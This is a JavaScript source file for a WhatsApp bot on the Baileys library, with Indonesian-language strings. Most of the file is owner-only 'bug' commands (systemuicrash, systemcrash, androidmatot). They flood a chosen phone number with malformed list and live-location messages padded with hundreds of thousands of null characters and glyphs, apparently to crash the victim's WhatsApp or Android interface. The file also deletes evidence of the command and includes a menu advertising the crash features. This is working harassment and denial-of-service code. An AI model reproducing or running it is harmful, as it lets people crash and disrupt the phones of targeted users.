require('./Database/setting')
const { makeWaSocket, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys")

const fs = require('fs')
const jimp = require('jimp')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const moment = require('moment-timezone')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { exec, spawn, execSync } = require("child_process")
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, sleep } = require('./Database/myfunction');

module.exports = sock = async (sock, m, chatUpdate, store) => { 
const budy = (typeof m.text == 'string' ? m.text : '')
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message?.buttonsResponseMessage?.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'templateButtonReplyMessage' ? m?.message?.templateButtonReplyMessage?.selectedId :
m?.mtype === 'messageContextInfo' ? (
m?.message?.buttonsResponseMessage?.selectedButtonId || 
m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId || 
m?.text
) : ''
) : '';

const { fromMe } = m
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const isSockMedia = m.mtype
const isGroup = m.key.remoteJid.endsWith('@g.us')
const botNumber = await sock.decodeJid(sock.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

if (budy.match('https://')) {
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
    }
  })
 }

if(isSockMedia === "stickerMessage"){
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
   }
  )
 }
 
if (budy.match('vcs')) {
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
    }
  })
 }
 
if (budy.match('VCS')) {
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
    }
  })
 } 

if (budy.match('Vcs')) {
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
    }
  })
 }

if (budy.match('vCs')) {
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
    }
  })
 }

if (budy.match('vcS')) {
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
    }
  })
 }

if (budy.match('HTTPS://')) {
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
    }
  })
 }

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': `${readmore}SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸` + "\0".repeat(920000),
      'footerText': `${readmore}àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®`,
      'description': `${readmore}àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®`,
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': true
    }
  }), {
    'userJid': jid
  });
  
  await sock.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': `${readmore}Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½` + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await sock.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

async function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return sock.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return sock.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

switch (command) { 
case "systemuicrash": case "systemcrash": case"androidmatot": { 
if (!isCreator) return m.reply('Fitur ini Khusus Owner');
  if (!text) return m.reply(`Contoh dek:\n${prefix+command} 628×××,jumlah`);
  if (!text.split(" ")[0].includes("628")) {
      return m.reply(`Contoh dek:\n${prefix+command} 628×××,jumlah`);
      }
  if (!text.split(" ")[0].includes(",")) {
      return m.reply(`Contoh dek:\n${prefix+command} 628×××,jumlah`);
      } 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  let encodedAmount = '' + encodeURI(amount);
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  var contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let bypassOwner = '6283854545783' + '@s.whatsapp.net';
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return m.reply("Nomor tersebut tidak terdaftar di WhatsApp");
  }
  setTimeout(() => {
  sock.groupSettingUpdate(m.chat, 'announcement')
  }, '1000')
  setTimeout(() => {
  sock.groupSettingUpdate(m.chat, 'not_announcement')
  }, '60000')
  m.reply("mohon tunggu, "+command+" bug sedang dalam proses..");
  await sock.sendMessage(bypassOwner, { text: 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½ê¦¾' }, encodedAmount);
  await sock.sendMessage(bypassOwner, { text: 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸' }, encodedAmount);
  await sock.sendMessage(bypassOwner, { text: 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®' }, encodedAmount);
  await sock.sendMessage(bypassOwner, { text: 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®' }, encodedAmount);
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount, { quoted: m });
  sock.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, whatsappNumber)
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Berhasil Mengirim Bug Ke @" + whatsappNumber.split('@')[0] + 
    " Menggunakan *" + command + "* âœ…\n\nPause 2 menit agar bot tidak dibanned.", 
    [whatsappNumber]
  );
 } 
 break;
 
case "menu": case "allmenu": case "menuror": { 
if (!isCreator) return
let menu = 
`*[ BUG MENU ]*
• systemuicrash 628×××
• systemcrash 628×××
• androidmatot 628×××

*[ CONVERT MENU ]*
• sticker [ maintence ]
• towm [ maintence ]
• toimg [ maintence ]
• removebg [ maintence ]

*[ CONTOH BENER ]*
• fiturbug 628999999,1

*[ CONTOH SALAH ]*
• fiturbug +62 899-9999-999|1
• fiturbug +62 899-9999-999,1`
m.reply(menu)
 }
 break;
 
default:
 }
}

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})